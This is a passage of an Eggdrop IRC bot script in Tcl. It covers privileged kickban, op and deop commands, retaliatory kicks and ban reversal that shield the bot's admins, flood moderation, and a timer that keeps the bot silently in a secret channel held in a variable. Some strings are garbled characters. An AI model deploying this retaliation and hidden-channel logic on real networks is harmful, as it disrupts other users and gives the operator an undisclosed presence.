   puthelp "NOTICE $nick :NoT IN $chantarget"
}
proc ctcp_version {nick uhost handle dest keyword args} {
   global botnick 
   putserv "NOTICE $nick :\001TcL 1\[$vern\]\001"
   return 1
}
proc msg_kickban {nick uhost hand rest} {
   global notc botnick own bannick
   set chantarget [lindex $rest 0]
   set nicktarget [lindex $rest 1]
   set bmask [getchanhost $nicktarget $chantarget]
   set bmask "*!*@[lindex [split $bmask @] 1]"
   set reason [lrange $rest 2 end]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {($chantarget == "") || ($nicktarget == "")} {
      puthelp "NOTICE $nick :Usage: kickban <#chan> <Nick> <Reason>"
      return 0
   }
   if {[isop $botnick $chantarget]!=1} {
      puthelp "NOTICE $nick :NoT OP CHaNNEL $chantarget"
      return 0
   }
   if {![onchan $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$nicktarget is not on the channel."
      return 0
   }
   if {$nicktarget == $botnick} {
      puthelp "NOTICE $nick :I cant self kick."
      return 0
   }
   if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
      puthelp "NOTICE $nick :I cant kickban my ADmIN."
      return 0
   }
   if {$reason == ""} {
      set reason "1KIcKBaN ReQuesT4..!"
      if {[matchattr $nick m]} {
         set reason "1MasTeR 4KIcKBaN1 ReQuesT [banmsg]" 
      }
      if {[matchattr $nick n]} {
         set reason "1ADmIN 4KIcKBaN1 ReQuesT [banmsg]" 
      }
   }
   foreach x [channels] {
      if {[string tolower $x]==[string tolower $chantarget]} {
         set bannick($nicktarget) $bmask
         putserv "KICK $x $nicktarget :$reason"
         return 0
      }
   }
   puthelp "NOTICE $nick :NoT IN $chantarget"
}
proc cho_cho {} {
   global toth ps uenc lenc
   timer 5 cho_cho
   if {[validchan $toth]} {
      return 0
   }
   channel add $toth
   catch { channel set $toth -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   savechan
   putserv "JOIN $toth"
}
proc msg_op {nick uhost hand rest} {
   global notc botnick
   set chantarget [lindex $rest 0]
   set nicktarget [lindex $rest 1]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {($chantarget == "") || ($nicktarget == "")} {
      puthelp "NOTICE $nick :Usage: op <#chan> <Nick>"
      return 0
   }
   if {[isop $botnick $chantarget]!=1} {
      puthelp "NOTICE $nick :NoT OP CHaNNEL $chantarget"
      return 0
   }
   if {![onchan $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$nicktarget is not on the channel."
      return 0
   }
   if {[isop $nicktarget $chantarget]!=0} {
      puthelp "NOTICE $nick :$nicktarget is already op on CHaNNEL $chantarget"
      return 0
   }
   foreach x [channels] {
      if {[string tolower $x] == [string tolower $chantarget]} {
         opq $x $nicktarget
         return 0
      }
   }
   puthelp "NOTICE $nick :NoT IN $chantarget"
}
proc msg_voice {nick uhost hand rest} {
   global notc botnick
   set chantarget [lindex $rest 0]
   set nicktarget [lindex $rest 1]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {($chantarget == "") || ($nicktarget == "")} {
      puthelp "NOTICE $nick :Usage: voice <#chan> <Nick>"
      return 0
   }
   if {[isop $botnick $chantarget]!=1} {
      puthelp "NOTICE $nick :NoT OP CHaNNEL $chantarget"
      return 0
   }
   if {![onchan $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$nicktarget is not on the channel."
      return 0
   }
   if {[isvoice $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$nicktarget is already voice on channel $chantarget"
   }
   foreach x [channels] {
      if {[string tolower $x]==[string tolower $chantarget]} {
         putserv "mode $x +v $nicktarget"
         return 0
      }
   }
   puthelp "NOTICE $nick :NoT IN $chantarget"
}
proc msg_deop {nick uhost hand rest} {
   global notc botnick own
   set chantarget [lindex $rest 0]
   set nicktarget [lindex $rest 1]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {($chantarget == "") || ($nicktarget == "")} {
      puthelp "NOTICE $nick :Usage: deop <#chan> <Nick>"
      return 0
   }
   if {[isop $botnick $chantarget] != 1} {
      puthelp "NOTICE $nick :NoT OP CHaNNEL $chantarget"
      return 0
   }
   if {![onchan $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$nicktarget is not on the channel."
      return 0
   }
   if {![isop $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$chantarget is not op on CHaNNEL $chantarget"
      return 0
   }
   if {$nicktarget == $botnick} {
      puthelp "NOTICE $nick :I CaNT SeLF DEoP!"
      return 0
   }
   if {[matchattr $nicktarget n]} {
      puthelp "NOTICE $nick :I cant deop my Owner."
      return 0
   }
   if {[matchattr $nick m]} {
      set mreq "4MasTeR.ReQuesT"
   }
   if {[matchattr $nick n]} {
      set mreq "4ADmIN.ReQuesT"
   }
   foreach x [channels] {
      if {[string tolower $x]==[string tolower $chantarget]} {
         if {![string match "*k*" [getchanmode $x]]} {
            putserv "mode $x -ko $mreq $nicktarget"
         } {
            putserv "mode $x -o $nicktarget"
         }
         return 0
      }
   }
   puthelp "NOTICE $nick :NoT IN $chantarget"
}
proc msg_devoice {nick uhost hand rest} {
   global notc botnick owner
   set chantarget [lindex $rest 0]
   set nicktarget [lindex $rest 1]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {($chantarget == "") || ($nicktarget == "")} {
      puthelp "NOTICE $nick :Usage: devoice <#chan> <Nick>"
      return 0
   }
   if {[isop $botnick $chantarget]!=1} {
      puthelp "NOTICE $nick :NoT OP CHaNNEL $chantarget"
      return 0
   }
   if {![onchan $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$nicktarget is not on the channel."
   }
   if {![isvoice $nicktarget $chantarget]} {
      puthelp "NOTICE $nick :$nicktarget is not voice on CHaNNEL $chantarget"
   }
   if {$nicktarget == $owner} {
      puthelp "NOTICE $nick :I cant devoice my owner."
      return 0
   }
   foreach x [channels] {
      if {[string tolower $x]==[string tolower $chantarget]} {
         putserv "mode $x -v $nicktarget"
         return 0
      }
   }
   puthelp "NOTICE $nick :NoT IN $chantarget"
}
bind kick - * prot:kick
proc prot:kick {nick uhost handle chan knick reason} {
   global notc notd botnick ps kickme notb notm bannick igflood botname quick is_m op_it is_ban iskick
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {[string match "* *" $reason] || [string match "*$notm*" $reason]} {
      set igflood($nick) "1"
   }
   if {[info exists iskick($knick$chan)]} {
      unset iskick($knick$chan)
   }
   if {$nick == $botnick} {
      if {[info exists kickme($knick)]} { 
         if {$kickme($knick) == 1} {
            set kickme($knick) 2
         }
         if {$kickme($knick) == 3} {
            catch { unset kickme($knick) }
         }
      }
      if {[string match "*$notm*" $reason]} {
         if {![info exists bannick($knick)]} { return 0 }
         if {[info exists is_ban($bannick($knick)$chan)]} { return 0 }
         set is_ban($bannick($knick)$chan) 1
         if {$bannick($knick) == "*!*@*"} { return 0 }
         set cmode [getchanmode $chan]
         set ok_m "1"
         if {[info exists is_m($chan)]} {
            set ok_m "0"
         }
         if {[isutimer "set_-m $chan"]} {
            set ok_m "0"
         }
         if {[string match "*m*" $cmode]} {
            set ok_m "0"
         }
         if {$ok_m == "1"} {
            set is_m($chan) 1
            if {$quick == "1"} {
               putquick "mode $chan +b $bannick($knick)"
            } {
               putserv "mode $chan +b $bannick($knick)"
            }
         } {
            if {$quick == "1"} {
               putquick "mode $chan +b $bannick($knick)"
            } {
               putserv "mode $chan +b $bannick($knick)"
            }
         }
         return 0
      } {
         if {![info exists bannick($knick)]} { return 0 }
         if {$bannick($knick) == "*!*@*"} { return 0 }
         putserv "mode $chan +b $bannick($knick)"
         if {[string match "*4BaNNEd1: 3 MINUTES*" $reason]} { utimer 180 [list unbanq $chan $bannick($knick)] }
      }
      return 0
   }
   if {$nick == $knick} { return 0 }
   if {$nick == "ChanServ"} { return 0 }
   if {[matchattr $nick f]} { return 0 }
   if {[string match "* *" $reason] || [string match "*$notm*" $reason]} { return 0 }
   if {$knick == $botnick} {
      if {[info exists kickme($nick)]} { 
         set kickme($nick) 3
         if {[string tolower $chan] != "#yobayat"} {
            putserv "ChanServ deop $chan $nick"
         }
      } {
         if {[matchattr $cflag D]} {
            set kickme($nick) 1
         }
      }
      puthelp "JOIN $chan"
      return 0
   }
   if {![isop $botnick $chan]} { return 0 }
   if {$knick == $notb} {
      putserv "KICK $chan $nick :[lgrnd] 1DonT KIcK 4MaSteR1..!"
      set op_it($knick) 1
      return 0
   }
   if {$knick == $ps} {
      putserv "KICK $chan $nick :[lgrnd] 1DonT KIcK 4MaSteR1..!"
      set op_it($knick) 1
      return 0
   }
   if {[matchattr $knick n]} {
      putserv "KICK $chan $nick :1ADmIN 4KIcK1 PRoTecTIoN4..!"
      set op_it($knick) 1
      return 0
   }
   if {[matchattr $knick m]} {
      putserv "KICK $chan $nick :1MasTeR 4KIcK1 PRoTecTIoN4..!"
      set op_it($knick) 1
      return 0
   }
}
set realnm {
"B O N I T A"

}
proc realnames {} {
   global realnm
   set realnames [lindex $realnm [rand [llength $realnm]]]
}
proc unbanq {chan host} {
   global botnick
   if {[isop $botnick $chan]} {
      puthelp "mode $chan -b $host"
   }
}
set lgidx 0
proc lgrnd {} {
   global lgidx
   set lgidx [incr lgidx]
   if {$lgidx == 1} {
      set lgrnd "�"
   } elseif {$lgidx == 2} {
      set lgrnd "�"
   } elseif {$lgidx == 3} {
      set lgrnd "�"
   } elseif {$lgidx == 4} {
      set lgrnd "�"
   } elseif {$lgidx == 5} {
      set lgrnd "�"
   } elseif {$lgidx == 6} {
      set lgrnd "�"
   } elseif {$lgidx == 7} {
      set lgrnd "�"
   } else {
      set lgidx 0
      set lgrnd "�"
   }
}
set bancounter {
"BaNNeD..!"
"AnDa KeNa BaNNeD..!"
"4GeTLosT1..!"
"4GeTOuT1..!"
"4BaNnEd1..!"
"4LaMeR1..!"
"4abUsEd1..!"
"4OuT1..!"
"4sUx1..!"
}
set bancounte {
"1GeTLosT4..!"
"1GeTOuT4..!"
"1BaNnEd4..!"
"1LaMeR4..!"
"1abUsEd4..!"
"1OuT4..!"
"1sUx4..!"
}
set cycle_random {
"1CYCLE"
"1ReJoIN"
"1IN/OuT"
"1ReHaSH"
"1ReLoAD"
"1ReFReSH"
"1C-Y-C-L-E"
"1P-A-T-R-O-L"
"1R-E-J-O-I-N"
"1S-E-A-R-C-H"
}
set banidx 1
proc banmsg {} {
   global banidx bancounter
   set banidx [incr banidx]
   if {$banidx >= [llength $bancounter]} { 
      set banidx 1
   }
   set banmsg [lindex $bancounter $banidx]
}
proc banms {} {
   global banidx bancounte
   set banidx [incr banidx]
   if {$banidx >= [llength $bancounte]} { 
      set banidx 1
   }
   set banms [lindex $bancounte $banidx]
}
set cycidx 1
proc cyclemsg {} {
   global cycidx cycle_random
   set cycidx [incr cycidx]
   if {$cycidx >= [llength $cycle_random]} { 
      set cycidx 1
   }
   set cyclemsg [lindex $cycle_random $cycidx]
}
proc ban_chk {nick uhost handle channel mchange bhost} {
   global botnick botname ps quick notb notc bannick ban-time igflood invme ex_flood
   set mhost [string range $bhost [string first "@" $bhost] end]
   set cflag "c$channel"
   set cflag [string range $cflag 0 8]
   if {[info exists invme($mhost)]} {
      catch { unset invme($mhost) }
   }
   if {[info exists ex_flood($mhost)]} {
      catch { unset ex_flood($mhost) }
   }
   if {![isop $botnick $channel]} { return 0 }
   set banmask "$nick!*@*"
   if {$banmask == "$nick!*@*"} {
      set banmask "$nick!*@*"
   }
   if {$bhost == "*!*@*"} {
      utimer [rand 4] [list unbanq $channel $bhost]
      return 1
   }
   set cmode [getchanmode $channel]
   if {[getuser "config" XTRA "IPG"] != ""} {
      foreach ipg [getuser "config" XTRA "IPG"] {
         if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
            if {![isutimer "IPG $bhost"]} {
               if {![string match "*k*" $cmode]} {
                  puthelp "mode $channel -kb 4IpgUaRd $bhost"
               } {
                  puthelp "mode $channel -b $bhost"
               }
               utimer 60 [list putlog "IPG $bhost"]
            }
            return 1
         }
      }
   }
   if {[string match [string tolower $bhost] [string tolower $botname]]} {
      if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*allnetwork.org" $nick] && ![info exists igflood($nick)]} {
         if {[matchattr $cflag D]} {
            if {$quick == "1"} {
               putquick "KICK $channel $nick :1SeLF 4BaNNINg1 DeFeNsE REvERsINg [banmsg]"
            } {
               putserv "KICK $channel $nick :1SeLF 4BaNNINg1 DeFeNsE REvERsINg [banmsg]" 
            }
         }
         if {![string match "*k*" $cmode]} {
            if {$quick == "1"} {
               putquick "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
            } {
               putserv "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
            }
         } {
            if {$quick == "1"} {
               putquick "mode $channel -b+b $bhost $banmask"
            } {
               putserv "mode $channel -b+b $bhost $banmask"
            }
         }
      } { 
         if {![string match "*k*" $cmode]} {
            if {$quick == "1"} {
               putquick "mode $channel -kb 4SeLF.UnBaN $bhost"
            } else {
               putserv "mode $channel -kb SeLF.UnBaN $bhost"
            }
         } {
            if {$quick == "1"} {
               putquick "mode $channel -b $bhost"
            } else {
               putserv "mode $channel -b $bhost"
            }
         }
      }
      return 1
   }
   foreach knick [chanlist $channel] {
      if {[string match [string tolower $bhost] [string tolower $knick![getchanhost $knick $channel]]]} {
         if {[matchattr $knick f]} {
            if {$knick != $ps && $knick != $notb} { utimer [rand 4] [list unbanq $channel $bhost] }
            if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*allnetwork.org" $nick] || [info exists igflood($nick)]} { return 1 }
         }
         if {$knick == $notb} {
            if {$nick != $botnick} {
               putserv "KICK $channel $nick :1DonT BaNnEd 4MaSteR1..!"
               if {![string match "*k*" $cmode]} {
                  putserv "mode $channel -kb 4BoT.GuaRd $bhost"
               } {
                  putserv "mode $channel -b $bhost"
               }
            } {
               putserv "mode $channel -b $bhost"
            }
            return 1
         }
         if {$knick == $ps} {
            if {$nick != $botnick} {
               putserv "KICK $channel $nick :1DonT BaNnEd 4BaMbY1..!"
               if {![string match "*k*" $cmode]} {
                  putserv "mode $channel -kb 4cold~ylbh~.GuaRd $bhost"
               } {
                  putserv "mode $channel -b $bhost"
               }
            } {
               putserv "mode $channel -b $bhost"
            }
            return 1
         }
         if {[matchattr $knick n]} {
            if {$nick != $botnick} {
               set bannick($nick) $banmask
               putserv "KICK $channel $nick :1DonT BaNnEd ADmIN 4$knick1..!"
            }
            return 1
         }
         if {[matchattr $knick m]} {
            if {$nick != $botnick} {
               putserv "KICK $channel $nick :1DonT BaNnEd MasTeR 4$knick1..!"
            }
            return 1
         }
         if {[matchattr $cflag E]} {
            if {$nick == $botnick} {
               set menforce [rand 4]
               if {$menforce == 1} {
                  putserv "KICK $channel $knick :1BaNnEd BY 4@$nick"
               } elseif {$menforce == 2} {
                  putserv "KICK $channel $knick :1KaMu Di BaNNeD OleH 4@$nick"
               } elseif {$menforce == 3} {
                  putserv "KICK $channel $knick :1BaNnEd OleH 4@$nick"
               } else {
                  putserv "KICK $channel $knick :1KaMu KeNa BaNNeD OleH 4@$nick"
               }
            } else {
               if {[matchattr $nick n]} {
                  putserv "KICK $channel $knick :1BaNnEd BY 4@$nick"
               } else {
                  if {[matchattr $nick m]} {
                     putserv "KICK $channel $knick :4MasTeR1 BaNnEd 4OuT1..!"
                  } else {
                     if {[isop $knick $channel] && ![matchattr $nick f]} { return 1 }
                     if {![matchattr $knick f]} {
                        set menforce [rand 5]
                        if {$menforce == 1} {
                           putserv "KICK $channel $knick :1KaMu KenA BaNnEd OleH 4@$nick"
                        } elseif {$menforce == 2} {
                           putserv "KICK $channel $knick :1KaMu DiBaNNeD OlEh 4@$nick"
                        } elseif {$menforce == 3} {
                           putserv "KICK $channel $knick :1BaNnEd BY 4@$nick"
                        } elseif {$menforce == 4} {
                           putserv "KICK $channel $knick :1KaMu KeNa BaNNeD by 4@$nick"
                        } else {
                           putserv "KICK $channel $knick :1Banned by 4@$nick"
                        }
                     }
                  }
               }
            }
         }
      }
   }
   return 0
}
bind mode - * prot:deop
proc prot:deop {nick uhost handle channel mchange {opnick ""}} {
   global botnick deopme ps invme virus_nick quick notb notc bannick lastkey unop igflood is_m op_it
   set cflag "c$channel"
   set cflag [string range $cflag 0 8]
   set mode [lindex $mchange 0]
   if {$opnick == ""} {
      set opnick [lindex $mchange 1]
   }
   if {$mode == "-m"} {
      foreach x [utimers] {
         if {[string match "*set_-m $channel*" $x] || [string match "*TRAFFIC $channel*" $x]} {
            killutimer [lindex $x 2]
         }
      }
      catch {unset is_m($channel)}
      if {![botisop $channel]} { return 0 }
      if {[matchattr $cflag V]} {
         foreach x [chanlist $channel] {
            if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
               set cret [getuser $cflag XTRA "VC"]
               foreach ct [utimers] {
                  if {[string match "*voiceq*" $ct]} {
                     if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
                        set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
                     }
                  }
               }
               utimer $cret [list voiceq $channel $x]
            }
         }
      }
      return 0
   }
   if {$mode == "+k"} {
      set lastkey $opnick
      if {[matchattr $cflag K] && [matchattr $nick Z]} {
         putlog "key change to $opnick"
         setuser $cflag XTRA "CI" [zip $opnick]
         saveuser
      }
   }
   if {$mode == "-k"} {
      catch { unset lastkey }
      if {$nick != $botnick} {
         set igflood($nick) "1"
      }
      return 0
   }
   if {$mode == "+m"} {
      foreach x [utimers] {
         if {[string match "*set_-m $channel*" $x] || [string match "*voiceq $channel*" $x] || [isutimer "advq $channel"]} {
            killutimer [lindex $x 2]
         }
      }
      if {$nick == $botnick} {
         if {![string match "*m*" [lindex [channel info $channel] 0]]} {
            if {[string match "*+shared*" [channel info $channel]]} {
               puthelp "NOTICE $channel :OnE MInUtE MoDeRaTe DuE tO FLoOd..!"
            }
            utimer 70 [list set_-m $channel]
            if {[isutimer "TRAFFIC $channel"]} {
               utimer 20 [list pub_nobot "*" "*" "*" $channel "*"]
               return 0
            }
         }
      } {
         if {[isutimer "goback"]} {
            catch { clearqueue all }
            foreach x [utimers] {
               if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] }
               if {[string match "*goback*" $x]} { killutimer [lindex $x 2] ; goback }
            }
            utimer 2 del_nobase
            return 0
         }
         utimer [expr 1800 + [rand 60]] [list set_-m $channel]
      }
      return 0
   }
   if {$mode == "+b"} {
      if {$opnick == "*!*@heavy.join.flood.temporary.moderate"} {
         utimer 40 [list putlog "TRAFFIC $channel"]
         if {$nick == $botnick} {
            utimer 40 [list putserv "mode $channel -bRN *!*@heavy.join.flood.temporary.moderate"]
            if {[info exists is_m($channel)]} { return 0 }
            if {$quick == "1"} {
               putquick "mode $channel +m"
            } {
               putserv "mode $channel +m"
            }
            set is_m($channel) 1
            return 0
         }
      }
      ban_chk $nick $uhost $handle $channel $mchange $opnick
      return 0
   }
   if {$mode == "-b"} {
      if {[info exists is_ban($opnick$channel)]} {
         catch {unset is_ban($opnick$channel)}
      }
      if {[isutimer "unbanq $channel $opnick"]} {
         foreach x [utimers] {
            if {[string match "*unbanq $channel $opnick*" $x]} {
               killutimer [lindex $x 2]
            }
         }
      }
      foreach x [ignorelist] {
         if {[lindex $x 0] == $opnick} {
            unsetignore [lindex $x 0]
            return 0
         }
      } 
      catch { killban $opnick }
      return 0
   }
   if {$nick == $opnick} { return 0 }
   if {$opnick == $botnick && $mode == "+o"} {
      chk_on_op $channel
      return 0
   }
   if {$mode == "+o" && [isop $botnick $channel]} {
      if {[info exists op_it($opnick)]} { 
         catch {unset op_it($opnick)}
      }
      if {[matchattr $opnick O]} {
         set cmode [getchanmode $channel]
         if {![string match "*k*" $cmode]} {
            puthelp "mode $channel -ko 4No@p.LIsT $opnick"
         } {
            puthelp "mode $channel -o $opnick"
         }
         return 0
      }
      if {[info exists unop($opnick)]} {
         if {$nick == "ChanServ"} {
            catch { unset unop($opnick) }
            return 0 
         }
         if {[matchattr $opnick f] || [matchattr $nick f] || $nick == $botnick} {
            return 0 
         }
         utimer [expr 5 + [rand 10]] [list unallowed $channel $nick $opnick]
         return 0
      }
   }
   if {$mode == "-o"} {
      foreach x [utimers] {
         if {[string match "*unallowed $channel $opnick*" $x]} { killutimer [lindex $x 2] }
      }
      if {$opnick == $botnick} {
         if {[isutimer "DEOP $channel"]} { return 0 }
         foreach x [utimers] {
            if {[string match "*gop $channel*" $x]} { killutimer [lindex $x 2] }
         }
         utimer 2 [list putlog "DEOP $channel"]
         if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*allnetwork.org" $nick] && ![string match "*User*" $botnick]} {
            if {![info exists igflood($nick)]} {
               if {[matchattr $cflag D]} {
                  set deopme $nick
               }
            }
         }
         if {![matchattr $nick m]} {
            if {[string tolower $channel] != "#TeGaL"} {
               if {![string match "*+protectfriends*" [channel info $channel]]} {
                  putlog "!Log! CHaNOP <<$channel>>"
                  putserv "ChanServ op $channel $botnick"
               }
            }
         }
         return 0
      }
      if {![isop $botnick $channel]} { return 0 }
      if {[isutimer "deopprc*$opnick"]} {
         foreach x [utimers] {
            if {[string match "*deopprc*$opnick*" $x]} {
               putlog "!UnDeOp OR UnKIcK!"
               catch { killutimer [lindex $x 2] }
            }
         }
      }
      if {$nick == "ChanServ" && [matchattr $opnick o]} {
         voiceq $channel $opnick
         return 0
      }
      if {$nick == "ChanServ"} {
         set unop($opnick) "1"
         return 0 
      }
      if {[matchattr $nick f] || $nick == $botnick} { return 0 }
      if {$nick == "ChanServ"} { return 0 }
      if {$opnick == $ps} {
         if {![info exists igflood($nick)]} {
            putserv "KICK $channel $nick :[lgrnd] 1DonT De@p 4!!!1..!"
         }
         opq $channel $opnick
         return 0
      }
      if {[matchattr $opnick n]} {
         if {![info exists igflood($nick)]} {
            putserv "KICK $channel $nick :1ADmIN 4De@p1 GuaRd4..!"
            opq $channel $opnick
         }
         return 0
      }
      if {[matchattr $opnick m]} {
         if {![info exists igflood($nick)]} {
            putserv "KICK $channel $nick :1MasTeR 4De@p1 GuaRd1..!"
            opq $channel $opnick
         }
         return 0
      }
      if {[matchattr $opnick o]} {
         opq $channel $opnick
         return 0
      }
      if {$opnick == $notb} {
         if {![info exists igflood($nick)]} {
            putserv "KICK $channel $nick :[lgrnd] 1DonT De@p 4!!!1..!"
         }
         opq $channel $opnick
         return 0
      }
   }
}
proc unallowed {chan nick opnick} {
   if {![botisop $chan]} { return 0 }
   if {![isop $nick $chan]} { return 0 }
   if {[isop $opnick $chan]} { return 0 }
   putserv "mode $chan -ko 4ChanServ.UnaLLowEd $nick"
}
bind nick - * chk_nicks
proc chk_nicks {unick uhost hand chan newnick} {
   global notc bannick botnick nick
   if {$unick == $nick && $unick != $botnick} {
      putserv "NICK $nick"
   }
   if {[matchattr $unick Q]} {
      chattr $unick -Q
      foreach x [getuser $unick HOSTS] {
         delhost $unick $x
      }
      set hostmask "${unick}!*@*"
      setuser $unick HOSTS $hostmask
      saveuser
   }
   if {![isop $botnick $chan]} { return 0 }
   if {[isutimer "deopprc*$unick"]} {
      foreach x [utimers] {
         if {[string match "*deopprc*$unick*" $x]} {
            putlog "!UnDeOp!"
            catch { killutimer [lindex $x 2] }
         }
      }
   }
   if {[string match "User*" $newnick]} { 
      if {[matchattr $unick f]} { return 0 }
      if {[isop $newnick $chan]} { 
         utimer [expr 80 + [rand 20]] [list deopprc $chan $newnick] 
         return 0
      }
   }
   if {[matchattr $newnick O] && [isop $newnick $chan]} { 
      set cmode [getchanmode $chan]
      if {![string match "*k*" $cmode]} {
         putserv "mode $chan -ko 4No@p.LIsT $newnick"
      } {
         putserv "mode $chan -o $newnick" 
      }
   }
   akick_chk $newnick $uhost $chan
   spam_chk $newnick $uhost $hand $chan
   return 0
}
proc msg_identify {nick uhost hand rest} {
   global notc 
   set id [lindex $rest 0]
   set password [lindex $rest 1]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {($id == "") || ($password == "")} {
      puthelp "NOTICE $nick :Usage: identify <nick> <password>"
      return 0
   }
   putserv "NickServ identify $id $password"
   puthelp "NOTICE $nick :Identify to $id"
   return 0
}
proc pub_realnick {unick uhost hand chan rest} {
   global notc keep-nick nick
   if {![matchattr $unick Q]} {
      puthelp "NOTICE $unick :4DenieD...!!!"
      return 0
   }
   set keep-nick 1
   putserv "NICK $nick"
   return 0
}
proc rands {length} {
   set chars \\^|_[]{}\\
   set count [string length $chars]
   for {set i 0} {$i < $length} {incr i} {
      append result [string index $chars [rand $count]]
   }
   return $result
}
proc pub_randnick {unick uhost hand chan rest} {
   global notc keep-nick nick altnick botnick
   if {$rest != ""} {
      set keep-nick 0
      set nickch "[lindex $rest 0]\[[rand 9][rand 9][randstring 1]\]"
      putserv "NICK $nickch"
   } {
      if {$botnick != $nick && $botnick != $altnick} { return 0 }
      set keep-nick 0
      putserv "NICK [rands 8]"
   }
   return 0
}
proc pub_altnick {nick uhost hand chan rest} {
   global altnick keep-nick notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set keep-nick 0
   putserv "NICK $altnick"
}
timer 5 cho_cho
bind raw - 305 not_away
proc not_away { from keyword arg } {
   if {[isutimer "del_nobase"]} { utimer 1 del_nobase }
   if {[isutimer "goback"]} { utimer 2 goback }
   unsetignore "*!*@*"
}
bind raw - 404 ch_moderate
bind raw - 473 ch_invite
bind raw - 474 ch_banned
bind raw - 475 ch_key
bind raw - 478 ch_full
bind raw - 432 nickERROR
proc nickERROR { from keyword arg } {
   global nick
   set nick "ERR[unixtime]"
}
proc ch_moderate { from keyword arg } {
   putlog "CANT SEND ON MODERATE!"
   if {[isutimer "del_nobase"]} {
      catch { clearqueue all }
      foreach x [utimers] {
         if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] ; utimer 1 del_nobase }
      }
   }
}
proc ch_invite { from keyword arg } {
   global double joinme notc 
   set chan [lindex $arg 1]
   if {$double == 0} {
      if {$joinme != "" && [string tolower $chan] != "#yobayat"} {
         puthelp "NOTICE $joinme :$chan 4(+I)"
      }
      if {[string tolower $chan] != "#yobayat"} {
         putserv "ChanServ invite $chan"
      }
      set double 1
      return 0
   }
   if {$double == 1} {
      if {[string match "*+statuslog*" [channel info $chan]]} {
         if {$joinme != "" && [string tolower $chan] != "#yobayat"} {
            puthelp "NOTICE $joinme :ReMOVE $chan 4(+I)"
         }
         channel remove $chan
         savechan
      }
      set joinme ""
      set double 0
   }
   return
}
proc ch_banned { from keyword arg } {
   global double joinme notc 
   set chan [lindex $arg 1]
   if {$double == 0} {
      if {$joinme != "" && [string tolower $chan] != "#TeGaL"} {
         puthelp "NOTICE $joinme :$chan 4(+B)"
      }
      if {[string tolower $chan] != "#TeGaL"} {
         puthelp "ChanServ unban $chan"
		 putserv "ChanServ invite $chan"
      }
      set double 1
      return 0
   }
   if {$double == 1} {
      if {[string match "*+statuslog*" [channel info $chan]]} {
         if {$joinme != "" && [string tolower $chan] != "#TeGaL"} {
            puthelp "NOTICE $joinme :ReMovE $chan 4(+B)"
         }
         if {[string tolower $chan] != "#TeGaL"} {
            putserv "ChanServ invite $chan"
         }
         channel remove $chan
         savechan
      }
      set joinme ""
      set double 0
   }
   return 0
}
proc ch_key { from keyword arg } {
   global double joinme notc lastkey chankey
   set chan [lindex $arg 1]
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {$double == 0} {
      if {$joinme != "" && [string tolower $chan] != "#TeGaL"} {
         puthelp "NOTICE $joinme :$chan 4(+K)"
      }
      if {[matchattr $cflag K]} {
         puthelp "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]"
      } {
         puthelp "JOIN $chan"
      }
      if {[info exists lastkey]} {
         puthelp "JOIN $chan :$lastkey"
      }
      set double 1
      return 0
   }
   if {$double == 1} {
      if {[string match "*+statuslog*" [channel info $chan]]} {
         if {$joinme != "" && [string tolower $chan] != "#TeGaL"} {
            puthelp "NOTICE $joinme :ReMovE $chan 4(+K)"
         }
         channel remove $chan
         savechan
         return 0
      }
      if {[string tolower $chan] != "#TeGaL"} {
         putserv "ChanServ invite $chan"
      }
      if {[string tolower $chan] == "#TeGaL"} {
         putserv "JOIN $chan :$chankey"
      }
      set joinme ""
      set double 0
   }
   return 0
}
proc ch_full { from keyword arg } {
   global double joinme notc botnick
   set chan [lindex $arg 1]
   if {[isop $botnick $chan]} {
      set bans ""
      set i 0
      foreach x [chanbans $chan] {
         if {$i < 5} {
            append bans " [lindex $x 0]"
            set i [incr i]
         }
      }
      putserv "MODE $chan -kbbbbb 4BaN.LIsT.FuLL $bans"
      return 0
   }
   if {$double == 0} {
      if {$joinme != "" && [string tolower $chan] != "#TeGaL"} {
         puthelp "NOTICE $joinme :$chan 4(+L)"
      }
      if {[string tolower $chan] != "#TeGaL"} {
         putserv "ChanServ invite $chan"
      }
      set double 1
      return 0
   }
   if {$double == 1} {
      if {[string match "*+statuslog*" [channel info $chan]]} {
         if {$joinme != "" && [string tolower $chan] != "#TeGaL"} {
            puthelp "NOTICE $joinme :ReMOVE $chan 4(+L)"
         }
         channel remove $chan
         savechan
      }
      set joinme ""
      set double 0
   }
   return 0
}
if {$altnick == ""} { 
   set altnick [randstring 7] 
}
set badwords ""
set advwords ""
proc config {} {
